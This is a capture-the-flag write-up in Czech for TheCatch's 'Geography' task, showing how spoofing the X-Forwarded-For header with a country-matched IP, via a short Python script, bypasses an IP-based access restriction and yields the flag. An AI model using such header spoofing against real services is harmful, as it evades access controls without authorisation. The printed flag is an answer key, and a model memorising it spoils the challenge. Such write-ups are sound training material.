# The Geography

## Zadání

```
Hi Expert,

the web site accessible via http://challenges.thecatch.cz/geography has some kind of access protection based on used IP addres. Try to overcome this obstacle and find out what is behind it.

Good Luck!

Hint: You can change your IP address, right? At least, the server can think so.
```

## Řešení

* Spuštění `curl http://challenges.thecatch.cz/geography` vypíše:

```
Challenge task : Try to visit again from IN, India
Challenge timeout (sec) : 120
```

* Úkolem tedy je navštívit web do 120 sekund z Indie
* Nový curl ovšem zobrazí požadavek na návštěvu z jiné země. Protokol HTTP je totiž bezstavový - pro autorizaci se používa cookie (viz úlohy Berserker's Web z roku 2019)
* Řešení může být buď využití nějakého "free proxy" serveru a nebo zkusit podvrhnout hlavičku `X-Forwarded-For` (https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
* Zkusil jsem podvrhnout hlavičku a IP adresu zjistit automaticky ze stránek http://www.iwik.org/ipcountry/

## Poznámka

Server mi dlouho vracel chybu 500 + prázdný obsah a to jak při pokusu použít `X-Forwarded-For`, tak i při využití proxy. Organizátoři soutěže mi ale potvrdili, že úloha funguje správně - je zajímavé že po obdržení této zprávy začal server odpovídat správně. Z následné komunikace s autory navíc vyplynulo, že zamýšlené řešení předpokládá použití proxy serveru a nikoliv jen podvržení hlavičky - které ovšem vede k cíli zjevně také :)


## Program pro výpis vlajky

[solve.py](solve.py)
```python
import requests

def getip(c):
    r = requests.get('https://www.iwik.org/ipcountry/%s.cidr' % c)
    a = r.text.split('\n')[1].strip()
    return a.split('/')[0]


r = requests.get('http://challenges.thecatch.cz/geography')

c = r.text.split(' from ')[1].split(',')[0]
print(c)

c = getip(c)

h = {'X-Forwarded-For': c}
r = requests.get('http://challenges.thecatch.cz/geography', cookies=r.cookies, headers=h)

print(r.text)

```

## Výstup
```
ZA
FLAG{OlFY-P2U0-86he-qU4q}
```
